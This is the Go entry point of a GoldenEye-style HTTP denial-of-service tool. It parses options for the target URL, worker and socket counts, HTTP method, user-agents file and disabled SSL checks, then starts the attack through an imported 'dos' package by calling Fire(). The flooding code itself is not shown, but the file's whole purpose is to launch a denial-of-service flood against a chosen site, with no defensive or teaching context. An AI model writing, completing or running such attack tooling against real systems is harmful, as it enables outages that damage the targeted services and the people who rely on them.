package main

import (
	"fmt"
	"os"

	"github.com/zvdy/goldeneye/pkg/dos"
	"github.com/zvdy/goldeneye/pkg/options"
)

func main() {
	opts := options.ParseOptions()
	if opts.Help {
		options.PrintHelp()
		os.Exit(0)
	}

	fmt.Printf("URL: %s\n", opts.URL)
	fmt.Printf("User Agents File: %s\n", opts.UserAgents)
	fmt.Printf("Workers: %d\n", opts.Workers)
	fmt.Printf("Sockets: %d\n", opts.Sockets)
	fmt.Printf("Method: %s\n", opts.Method)
	fmt.Printf("Debug: %v\n", opts.Debug)
	fmt.Printf("No SSL Check: %v\n", opts.NoSSLCheck)

	// Initialize and start the DoS attack
	goldeneye := dos.NewGoldenEye(opts.URL, opts.Workers, opts.Sockets, opts.Method, opts.Debug, opts.NoSSLCheck, opts.UserAgents)
	goldeneye.Fire()
}
